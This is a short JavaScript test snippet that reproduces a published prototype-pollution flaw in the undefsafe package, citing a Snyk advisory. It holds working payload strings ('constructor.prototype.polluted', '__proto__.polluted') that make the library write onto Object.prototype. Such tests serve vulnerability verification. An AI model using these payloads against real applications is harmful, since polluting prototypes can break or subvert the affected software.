// //https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
// test("prototype pollution in undefsafe ", () => {
console.log({}.polluted);

  const a = require("undefsafe");
  const obj = {};
  const payload = "constructor.prototype.polluted";
  //const payload = "__proto__.polluted";
  a({}, payload, "yes");

console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
